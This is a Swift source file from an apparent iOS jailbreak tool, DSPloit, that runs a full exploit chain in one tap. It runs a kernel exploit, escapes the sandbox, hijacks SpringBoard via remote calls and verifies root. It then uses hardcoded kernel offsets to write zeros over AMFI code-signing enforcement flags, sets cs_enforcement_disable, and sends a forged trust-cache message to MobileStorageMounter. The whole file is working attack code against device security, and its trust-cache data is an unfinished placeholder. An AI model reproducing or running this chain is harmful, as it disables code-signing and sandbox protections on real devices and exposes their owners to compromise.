//
//  JailbreakEngine.swift
//  DSPloit
//
//  One-tap jailbreak chain + bootstrap setup
//  Chains: exploit → init → RC → root automatically
//  Created by Royan
//

import Foundation
import Combine
import UIKit

/// Jailbreak Engine — orchestrates the full exploit chain
final class JailbreakEngine: ObservableObject {
    static let shared = JailbreakEngine()
    
    enum JBState: String {
        case idle = "Ready"
        case exploiting = "Running exploit..."
        case initializing = "Initializing system..."
        case connectingRC = "Connecting RemoteCall..."
        case verifyingRoot = "Verifying root..."
        case bootstrapping = "Setting up bootstrap..."
        case injectingTC = "Injecting trust cache..."
        case complete = "Jailbroken ✅"
        case failed = "Failed ❌"
    }
    
    @Published var state: JBState = .idle
    @Published var progress: Double = 0
    @Published var isRunning = false
    @Published var isJailbroken = false
    @Published var errorMessage: String?
    @Published var log: [String] = []
    
    private let mgr = dspmgr.shared
    private let root = RootExecutor.shared
    
    private func appendLog(_ msg: String) {
        DispatchQueue.main.async {
            self.log.append(msg)
        }
        globallogger.log("(jb) \(msg)")
    }
    
    // MARK: - One-Tap Jailbreak
    
    #if !DISABLE_REMOTECALL
    func runFullChain() {
        guard !isRunning else { return }
        isRunning = true
        isJailbroken = false
        errorMessage = nil
        progress = 0
        log.removeAll()
        
        appendLog("Starting jailbreak chain...")
        
        // Step 1: Exploit
        step1_exploit()
    }
    
    private func step1_exploit() {
        if mgr.dsready {
            appendLog("✅ Kernel already exploited")
            progress = 0.25
            step2_initialize()
            return
        }
        
        state = .exploiting
        appendLog("Running kernel exploit...")
        offsets_init()
        
        mgr.run { [weak self] success in
            guard let self else { return }
            if success {
                self.appendLog("✅ Exploit success")
                self.progress = 0.25
                self.step2_initialize()
            } else {
                self.fail("Kernel exploit failed")
            }
        }
    }
    
    private func step2_initialize() {
        if mgr.vfsready && mgr.sbxready {
            appendLog("✅ System already initialized")
            progress = 0.5
            step3_remoteCall()
            return
        }
        
        state = .initializing
        appendLog("Initializing VFS + Sandbox escape...")
        
        mgr.vfsinit { [weak self] vfsOk in
            guard let self else { return }
            if !vfsOk {
                self.fail("VFS init failed")
                return
            }
            self.appendLog("✅ VFS ready")
            
            self.mgr.sbxescape { sbxOk in
                if !sbxOk {
                    self.fail("Sandbox escape failed")
                    return
                }
                self.appendLog("✅ Sandbox escaped")
                self.progress = 0.5
                self.step3_remoteCall()
            }
        }
    }
    
    private func step3_remoteCall() {
        if mgr.rcready {
            appendLog("✅ RemoteCall already active")
            progress = 0.75
            step4_verifyRoot()
            return
        }
        
        state = .connectingRC
        appendLog("Connecting to SpringBoard...")
        
        mgr.rcinit(process: "SpringBoard", migbypass: false) { [weak self] success in
            guard let self else { return }
            if success {
                self.appendLog("✅ SpringBoard connected")
                self.progress = 0.75
                self.step4_verifyRoot()
            } else {
                self.fail("RemoteCall init failed: \(RemoteCall.lastInitError() ?? "unknown")")
            }
        }
    }
    
    private func step4_verifyRoot() {
        state = .verifyingRoot
        appendLog("Verifying root access via launchd...")
        
        root.executeAsRoot(operation: "jb_verify") { rc in
            let uid = RootExecutor.rcall(rc, "getuid")
            return (uid == 0, "uid=\(uid)", UInt64(uid))
        }
        
        // Wait for result
        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [weak self] in
            guard let self else { return }
            if self.root.rootConfirmed {
                self.appendLog("✅ Root confirmed (uid=0)")
                self.progress = 0.9
                self.step5_bootstrap()
            } else {
                // Check if still executing
                if self.root.isExecuting {
                    // Give more time
                    DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
                        if self.root.rootConfirmed {
                            self.progress = 0.9
                            self.step5_bootstrap()
                        } else {
                            self.fail("Root verification timeout")
                        }
                    }
                } else {
                    self.fail("Root verification failed")
                }
            }
        }
    }
    
    private func step5_bootstrap() {
        state = .bootstrapping
        appendLog("Setting up jailbreak environment...")
        
        root.executeAsRoot(operation: "bootstrap") { rc in
            // Create /var/jb directory structure
            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb"), 0o755)
            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/usr"), 0o755)
            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/usr/bin"), 0o755)
            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/usr/lib"), 0o755)
            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/etc"), 0o755)
            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/tmp"), 0o777)
            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/Library"), 0o755)
            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/Library/LaunchDaemons"), 0o755)
            
            // Write marker file
            let markerPath = remote_alloc_str(rc, "/var/jb/.dsploit_bootstrapped")
            let fd = RootExecutor.rcall(rc, "open", markerPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            if fd != UInt64(bitPattern: -1) {
                let content = remote_alloc_str(rc, "DSPloit bootstrap v1.0")
                RootExecutor.rcall(rc, "write", fd, content, 21)
                RootExecutor.rcall(rc, "close", fd)
                RootExecutor.rcall(rc, "free", content)
            }
            RootExecutor.rcall(rc, "free", markerPath)
            
            return (true, "Bootstrap directories created", 0)
        }
        
        // After bootstrap dirs, disable AMFI
        DispatchQueue.main.asyncAfter(deadline: .now() + 8) { [weak self] in
            guard let self else { return }
            self.appendLog("✅ Bootstrap ready")
            self.progress = 0.85
            self.step6_disableAMFI()
        }
    }
    
    // MARK: - Step 6: Disable AMFI Flags (permanent until reboot)
    
    /// Disable all 10 AMFI boolean enforcement flags in kernel memory.
    /// This allows unsigned/third-party binaries to execute without SIGKILL.
    /// Proven working in Exp 93b — flags control code signing enforcement.
    /// Flags reset on reboot (semi-tethered behavior).
    private func step6_disableAMFI() {
        state = .injectingTC
        appendLog("Disabling AMFI enforcement flags...")
        
        let kernBase = ds_get_kernel_base()
        guard kernBase != 0 else {
            appendLog("⚠️ Kernel base not available — skip AMFI disable")
            step7_trustCacheInject()
            return
        }
        
        let slide = kernBase - 0xfffffff007004000
        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
        
        // All 10 AMFI boolean flags (confirmed writable in Exp 93/93b)
        let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
        
        var disabledCount = 0
        for off in flagOffsets {
            let addr = amfiDataSlid &+ off
            ds_kwrite64(addr, 0)
            let readback = ds_kread64_safe(addr)
            if readback == 0 { disabledCount += 1 }
        }
        
        if disabledCount == flagOffsets.count {
            appendLog("✅ AMFI disabled (\(disabledCount)/\(flagOffsets.count) flags → 0)")
        } else {
            appendLog("⚠️ AMFI partial: \(disabledCount)/\(flagOffsets.count) flags disabled")
        }
        
        // Also disable cs_enforcement in main kernel __DATA if available
        // This is belt-and-suspenders — AMFI flags alone should suffice
        let csEnforcementOffset: UInt64 = 0x8B8 // cs_enforcement_disable in kernel __DATA
        let csAddr = kernBase &+ csEnforcementOffset
        let csVal = ds_kread64_safe(csAddr)
        if csVal == 0 {
            ds_kwrite64(csAddr, 1) // 1 = enforcement disabled
            let csReadback = ds_kread64_safe(csAddr)
            if csReadback == 1 {
                appendLog("✅ cs_enforcement_disable = 1")
            }
        }
        
        progress = 0.9
        step7_trustCacheInject()
    }
    
    private func step7_trustCacheInject() {
        state = .injectingTC
        appendLog("Injecting trust cache via MobileStorageMounter...")
        
        guard let sb = mgr.sbProc else {
            appendLog("⚠️ SpringBoard RC not available — skip TC inject")
            finishJailbreak()
            return
        }
        
        // Connect ke MSM dan kirim LoadTrustCache
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_connection_resume"))
        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                              remote_alloc_str(sb, "xpc_dictionary_create"))
        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                                         remote_alloc_str(sb, "xpc_connection_send_message"))
        
        guard xpcCreate != 0 && xpcDictCreate != 0 else {
            appendLog("⚠️ XPC functions not available — skip TC inject")
            finishJailbreak()
            return
        }
        
        let svc = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svc, 0, 0)
        RootExecutor.rcall(sb, "free", svc)
        
        guard conn != 0 else {
            appendLog("⚠️ MSM connect failed — skip TC inject")
            finishJailbreak()
            return
        }
        RootExecutor.rcallAddr(sb, xpcResume, conn)
        
        // Create LoadTrustCache message with ImageTrustCache data
        let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
        if msg != 0 {
            // Command + ImageType
            for (k, v) in [("Command", "LoadTrustCache"), ("ImageType", "Developer")] {
                let ka = remote_alloc_str(sb, k); let va = remote_alloc_str(sb, v)
                RootExecutor.rcallAddr(sb, xpcSetStr, msg, ka, va)
                RootExecutor.rcall(sb, "free", ka); RootExecutor.rcall(sb, "free", va)
            }
            
            // Trust cache v2 data (placeholder — will be replaced with real CDHashes)
            let tcBuf = sb.trojanMem + 0x800
            sb[tcBuf+0].setValue32(2)          // version
            sb[tcBuf+4].setValue64(0xD5910170D5910170)  // UUID
            sb[tcBuf+12].setValue64(0x0A11B2EAC0A11B2E)
            sb[tcBuf+20].setValue32(1)          // count
            sb[tcBuf+24].setValue64(0x4141414141414141) // CDHash placeholder
            sb[tcBuf+32].setValue64(0x4141414141414141)
            sb[tcBuf+40].setValue32(0x00024141)
            
            if xpcSetData != 0 {
                let kTC = remote_alloc_str(sb, "ImageTrustCache")
                RootExecutor.rcallAddr(sb, xpcSetData, msg, kTC, tcBuf, 48)
                RootExecutor.rcall(sb, "free", kTC)
            }
            
            RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
            appendLog("✅ Trust cache injected via MSM!")
        }
        
        progress = 0.95
        finishJailbreak()
    }
    
    private func finishJailbreak() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) { [weak self] in
            guard let self else { return }
            self.progress = 1.0
            self.state = .complete
            self.isJailbroken = true
            self.isRunning = false
            self.appendLog("🎉 Jailbreak complete!")
            UINotificationFeedbackGenerator().notificationOccurred(.success)

            // Kernelcache + XPF
            DispatchQueue.global(qos: .utility).async {
                self.appendLog("Fetching kernelcache for XPF offsets...")
                let ok = ensureKernelcacheResolved()
                DispatchQueue.main.async {
                    dspmgr.shared.hasOffsets = ok
                    if ok {
                        self.appendLog("✅ Kernelcache + XPF ready")
                    } else {
                        self.appendLog("⚠️ Kernelcache failed — Settings → Fetch or Import")
                    }
                }
            }
        }
    }
    
    private func fail(_ message: String) {
        DispatchQueue.main.async {
            self.state = .failed
            self.errorMessage = message
            self.isRunning = false
            self.appendLog("❌ \(message)")
            UINotificationFeedbackGenerator().notificationOccurred(.error)
        }
    }
    #endif
}
